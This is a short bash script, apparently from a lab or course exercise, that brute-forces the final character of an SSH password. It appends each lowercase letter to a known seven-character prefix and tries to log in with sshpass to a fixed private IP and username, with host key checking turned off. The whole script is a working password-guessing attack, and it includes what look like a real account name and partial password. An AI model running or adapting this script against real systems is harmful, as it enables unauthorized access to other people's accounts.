#!/bin/bash

# The known part of the password
KNOWN_PASSWORD="xbjycmj"   # Replace with the given first seven characters of the password

# The target user and server
USER="s2022103572"        # Replace with the username
HOST="10.5.12.254"       # Replace with the server IP or hostname

# Loop through possible lowercase characters (a-z)
for char in {a..z}; do
    # Construct the full password by appending the character
    FULL_PASSWORD="${KNOWN_PASSWORD}${char}"

    echo "Trying password: $FULL_PASSWORD"

    # Try to SSH with the constructed password
    sshpass -p "$FULL_PASSWORD" ssh -o StrictHostKeyChecking=no "$USER@$HOST" exit

    # Check the exit status of SSH
    if [ $? -eq 0 ]; then
        echo "Password found: $FULL_PASSWORD"
        exit 0
    fi
done

echo "Password not found."
